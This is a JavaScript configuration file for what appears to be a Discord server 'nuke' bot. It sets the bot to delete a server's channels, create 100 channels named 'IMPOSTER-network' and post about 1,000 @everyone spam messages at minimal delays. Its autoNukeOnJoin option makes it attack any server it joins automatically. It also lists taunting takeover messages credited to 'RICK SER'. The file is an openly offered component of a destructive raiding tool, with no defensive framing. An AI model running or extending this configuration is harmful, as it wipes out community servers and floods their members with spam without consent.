// config.js - ULTRA FAST NUKE CONFIG
require('dotenv').config();

module.exports = {
    // Bot Settings
    token: process.env.DISCORD_TOKEN || 'YOUR_BOT_TOKEN_HERE',
    prefix: '!',
    
    // ULTRA NUKE Settings
    channelName: 'IMPOSTER-network',
    spamMessage: '@everyone NUKE BY RICK SER 💀🔥',
    channelsToCreate: 100,           // 100 CHANNELS
    messagesPerChannel: 10,           // 10 messages each = 1000 TOTAL
    
    // FAST DELAY Settings (MINIMAL to maximize speed)
    delays: {
        delete: 100,      // SUPER FAST deletion (100ms)
        create: 150,       // FAST creation (150ms)
        spam: 50,          // ULTRA FAST spam (50ms)
        embed: 100         // FAST embed
    },
    
    // Auto Nuke Settings
    autoNukeOnJoin: true,
    
    // Server Settings
    port: process.env.PORT || 3000,
    
    // Bot Status
    statusMessages: [
        '💀 ULTRA NUKE READY',
        '🔥 100 CHANNELS',
        '⚡ 1000 MENTIONS',
        '💀 @everyone SPAM'
    ],
    
    // SPAM MESSAGES WITH @EVERYONE
    spamMessages: [
        '@everyone 💀 **NUKE BY RICK SER** 💀',
        '@everyone 🔥 **IMPOSTER NETWORK TAKEOVER** 🔥',
        '@everyone ⚡ **THIS SERVER IS GONE** ⚡',
        '@everyone 💀 **100 CHANNELS CREATED** 💀',
        '@everyone 🔥 **1000 MESSAGES SENT** 🔥',
        '@everyone ⚡ **GET F** ⚡',
        '@everyone 💀 **RICK SER OWNS THIS** 💀',
        '@everyone 🔥 **IMPOSTER RULES** 🔥',
        '@everyone ⚡ **CHANNELS DELETED** ⚡',
        '@everyone 💀 **NO ESCAPE** 💀'
    ]
};
